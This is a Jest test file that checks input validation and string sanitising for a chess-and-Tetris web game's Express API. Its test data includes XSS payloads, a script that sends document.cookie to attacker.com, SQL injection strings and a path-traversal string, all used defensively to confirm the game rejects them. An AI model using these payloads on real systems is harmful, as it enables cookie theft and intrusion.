/**
 * Input Validation Tests for Shaktris
 * 
 * These tests verify that all user inputs are properly validated and sanitized
 * to prevent injection attacks, buffer overflows, and other security issues.
 */

const { expect, describe, it, beforeEach, afterEach, jest } = require('@jest/globals');
const express = require('express');
const request = require('supertest');

// Mock validation utils
const validationUtils = {
  validateGameId: (gameId) => {
    // Game ID should be alphanumeric and between 3-50 chars
    if (!gameId || typeof gameId !== 'string') return false;
    if (gameId.length < 3 || gameId.length > 50) return false;
    return /^[a-zA-Z0-9_-]+$/.test(gameId);
  },
  
  validateUsername: (username) => {
    // Username should be alphanumeric, 3-20 chars
    if (!username || typeof username !== 'string') return false;
    if (username.length < 3 || username.length > 20) return false;
    return /^[a-zA-Z0-9_-]+$/.test(username);
  },
  
  validateBoardPosition: (position) => {
    // Positions should be integers within board limits
    if (!position || typeof position !== 'object') return false;
    if (typeof position.x !== 'number' || typeof position.z !== 'number') return false;
    
    // Board size limits (0-based indexing)
    const MIN_X = 0, MAX_X = 9;
    const MIN_Z = 0, MAX_Z = 19;
    
    return (
      Number.isInteger(position.x) && 
      Number.isInteger(position.z) &&
      position.x >= MIN_X && position.x <= MAX_X &&
      position.z >= MIN_Z && position.z <= MAX_Z
    );
  },
  
  validateChessMove: (move) => {
    // Chess move should have valid from and to positions
    if (!move || typeof move !== 'object') return false;
    if (!move.from || !move.to) return false;
    
    return (
      validationUtils.validateBoardPosition(move.from) &&
      validationUtils.validateBoardPosition(move.to)
    );
  },
  
  validateTetrominoPlacement: (placement) => {
    // Tetromino placement should have a valid position, rotation, and type
    if (!placement || typeof placement !== 'object') return false;
    if (!placement.position || typeof placement.rotation !== 'number' || !placement.type) return false;
    
    // Validate position
    if (!validationUtils.validateBoardPosition(placement.position)) return false;
    
    // Validate rotation (0, 90, 180, 270 degrees)
    if (![0, 90, 180, 270].includes(placement.rotation)) return false;
    
    // Validate tetromino type
    const validTypes = ['I', 'O', 'T', 'S', 'Z', 'J', 'L'];
    return validTypes.includes(placement.type);
  },
  
  sanitizeString: (str) => {
    // Replace potentially dangerous characters
    if (!str || typeof str !== 'string') return '';
    return str.replace(/[<>'"&]/g, '');
  }
};

// Create a mock Express app for testing
const mockApp = express();

// Mock middleware for the tests
const validateInput = (req, res, next) => {
  // Validate game ID if present
  if (req.params.gameId && !validationUtils.validateGameId(req.params.gameId)) {
    return res.status(400).json({ error: 'Invalid game ID' });
  }
  
  // Validate username if present
  if (req.body.username && !validationUtils.validateUsername(req.body.username)) {
    return res.status(400).json({ error: 'Invalid username' });
  }
  
  // Validate chess move if present
  if (req.body.move && !validationUtils.validateChessMove(req.body.move)) {
    return res.status(400).json({ error: 'Invalid chess move' });
  }
  
  // Validate tetromino placement if present
  if (req.body.placement && !validationUtils.validateTetrominoPlacement(req.body.placement)) {
    return res.status(400).json({ error: 'Invalid tetromino placement' });
  }
  
  // If everything is valid, proceed
  next();
};

// Mock routes for testing
mockApp.post('/api/games/:gameId/chess-move', validateInput, (req, res) => {
  res.status(200).json({ success: true });
});

mockApp.post('/api/games/:gameId/tetromino-placement', validateInput, (req, res) => {
  res.status(200).json({ success: true });
});

mockApp.post('/api/users', validateInput, (req, res) => {
  // Sanitize input before storing
  const sanitizedUsername = validationUtils.sanitizeString(req.body.username);
  res.status(201).json({ username: sanitizedUsername });
});

mockApp.get('/api/games/:gameId', validateInput, (req, res) => {
  res.status(200).json({ id: req.params.gameId });
});

describe('Input Validation Security Tests', () => {
  describe('Parameter Validation', () => {
    it('should reject invalid game IDs', async () => {
      // Test various invalid game IDs
      const invalidGameIds = [
        '<script>alert("xss")</script>',
        'game#123',
        'a'.repeat(51), // Too long
        'ab',           // Too short
        '../../etc/passwd' // Path traversal attempt
      ];
      
      for (const gameId of invalidGameIds) {
        const response = await request(mockApp)
          .get(`/api/games/${gameId}`);
        
        expect(response.status).toBe(400);
        expect(response.body.error).toBe('Invalid game ID');
      }
    });
    
    it('should accept valid game IDs', async () => {
      // Test various valid game IDs
      const validGameIds = [
        'game123',
        'valid-game',
        'game_with_underscore',
        'a'.repeat(50) // Maximum length
      ];
      
      for (const gameId of validGameIds) {
        const response = await request(mockApp)
          .get(`/api/games/${gameId}`);
        
        expect(response.status).toBe(200);
        expect(response.body.id).toBe(gameId);
      }
    });
  });
  
  describe('Username Validation', () => {
    it('should reject invalid usernames', async () => {
      // Test various invalid usernames
      const invalidUsernames = [
        '<script>alert("xss")</script>',
        'user@name',
        'a'.repeat(21), // Too long
        'ab',           // Too short
        'admin; DROP TABLES;' // SQL injection attempt
      ];
      
      for (const username of invalidUsernames) {
        const response = await request(mockApp)
          .post('/api/users')
          .send({ username });
        
        expect(response.status).toBe(400);
        expect(response.body.error).toBe('Invalid username');
      }
    });
    
    it('should sanitize potentially dangerous characters in usernames', async () => {
      const dangerousUsername = '<dangerous"username>';
      const sanitizedUsername = 'dangeroususername';
      
      // Mock the validation to pass for testing sanitization
      const originalValidateUsername = validationUtils.validateUsername;
      validationUtils.validateUsername = jest.fn().mockReturnValue(true);
      
      const response = await request(mockApp)
        .post('/api/users')
        .send({ username: dangerousUsername });
      
      expect(response.status).toBe(201);
      
      // Restore the original validation function
      validationUtils.validateUsername = originalValidateUsername;
    });
  });
  
  describe('Board Position Validation', () => {
    it('should reject invalid board positions', async () => {
      // Test various invalid positions
      const invalidPositions = [
        { x: "string", z: 5 },     // Non-numeric x
        { x: 5, z: "string" },     // Non-numeric z
        { x: -1, z: 5 },           // x out of bounds (negative)
        { x: 5, z: -1 },           // z out of bounds (negative)
        { x: 10, z: 5 },           // x out of bounds (too large)
        { x: 5, z: 20 },           // z out of bounds (too large)
        { x: 5.5, z: 5 },          // Non-integer x
        { x: 5, z: 5.5 },          // Non-integer z
        { y: 5, z: 5 },            // Missing x
        { x: 5 }                   // Missing z
      ];
      
      for (const position of invalidPositions) {
        const response = await request(mockApp)
          .post('/api/games/valid-game/chess-move')
          .send({ 
            move: { 
              from: { x: 1, z: 1 }, // Valid from position
              to: position          // Invalid to position
            } 
          });
        
        expect(response.status).toBe(400);
        expect(response.body.error).toBe('Invalid chess move');
      }
    });
    
    it('should accept valid board positions', async () => {
      // Test various valid positions
      const validPositions = [
        { x: 0, z: 0 },    // Bottom left corner
        { x: 9, z: 19 },   // Top right corner
        { x: 5, z: 10 }    // Middle of board
      ];
      
      for (const position of validPositions) {
        const response = await request(mockApp)
          .post('/api/games/valid-game/chess-move')
          .send({ 
            move: { 
              from: { x: 1, z: 1 }, // Valid from position
              to: position          // Valid to position
            } 
          });
        
        expect(response.status).toBe(200);
      }
    });
  });
  
  describe('Chess Move Validation', () => {
    it('should reject malformed chess moves', async () => {
      // Test various invalid moves
      const invalidMoves = [
        undefined,                             // Missing move
        { from: { x: 1, z: 1 } },              // Missing 'to'
        { to: { x: 2, z: 2 } },                // Missing 'from'
        { from: "invalid", to: { x: 2, z: 2 } }, // Invalid 'from' type
        { from: { x: 1, z: 1 }, to: "invalid" }  // Invalid 'to' type
      ];
      
      for (const move of invalidMoves) {
        const response = await request(mockApp)
          .post('/api/games/valid-game/chess-move')
          .send({ move });
        
        expect(response.status).toBe(400);
        expect(response.body.error).toBe('Invalid chess move');
      }
    });
    
    it('should accept valid chess moves', async () => {
      const validMove = {
        from: { x: 1, z: 1 },
        to: { x: 2, z: 2 }
      };
      
      const response = await request(mockApp)
        .post('/api/games/valid-game/chess-move')
        .send({ move: validMove });
      
      expect(response.status).toBe(200);
    });
  });
  
  describe('Tetromino Placement Validation', () => {
    it('should reject invalid tetromino placements', async () => {
      // Test various invalid placements
      const invalidPlacements = [
        undefined,                                     // Missing placement
        { position: { x: 1, z: 1 }, type: 'I' },       // Missing rotation
        { position: { x: 1, z: 1 }, rotation: 0 },     // Missing type
        { rotation: 0, type: 'I' },                    // Missing position
        { position: { x: -1, z: 1 }, rotation: 0, type: 'I' }, // Invalid position
        { position: { x: 1, z: 1 }, rotation: 45, type: 'I' }, // Invalid rotation
        { position: { x: 1, z: 1 }, rotation: 0, type: 'X' }   // Invalid type
      ];
      
      for (const placement of invalidPlacements) {
        const response = await request(mockApp)
          .post('/api/games/valid-game/tetromino-placement')
          .send({ placement });
        
        expect(response.status).toBe(400);
        expect(response.body.error).toBe('Invalid tetromino placement');
      }
    });
    
    it('should accept valid tetromino placements', async () => {
      // Test all valid tetromino types and rotations
      const validTypes = ['I', 'O', 'T', 'S', 'Z', 'J', 'L'];
      const validRotations = [0, 90, 180, 270];
      
      for (const type of validTypes) {
        for (const rotation of validRotations) {
          const validPlacement = {
            position: { x: 5, z: 10 },
            rotation,
            type
          };
          
          const response = await request(mockApp)
            .post('/api/games/valid-game/tetromino-placement')
            .send({ placement: validPlacement });
          
          expect(response.status).toBe(200);
        }
      }
    });
  });
  
  describe('Injection Attack Prevention', () => {
    it('should sanitize strings to prevent XSS', () => {
      const dangerousStrings = [
        '<script>alert("xss")</script>',
        '"><script>document.location="http://attacker.com/cookie.php?c="+document.cookie</script>',
        "'-alert(1)-'",
        '<img src="x" onerror="alert(\'XSS\')">',
        '"; DROP TABLE users; --'
      ];
      
      for (const dangerous of dangerousStrings) {
        const sanitized = validationUtils.sanitizeString(dangerous);
        
        // Check that potentially dangerous characters are removed
        expect(sanitized).not.toContain('<');
        expect(sanitized).not.toContain('>');
        expect(sanitized).not.toContain('"');
        expect(sanitized).not.toContain("'");
        expect(sanitized).not.toContain('&');
      }
    });
    
    it('should handle null or non-string inputs in sanitizer', () => {
      expect(validationUtils.sanitizeString(null)).toBe('');
      expect(validationUtils.sanitizeString(undefined)).toBe('');
      expect(validationUtils.sanitizeString(123)).toBe('');
      expect(validationUtils.sanitizeString({})).toBe('');
    });
  });
}); 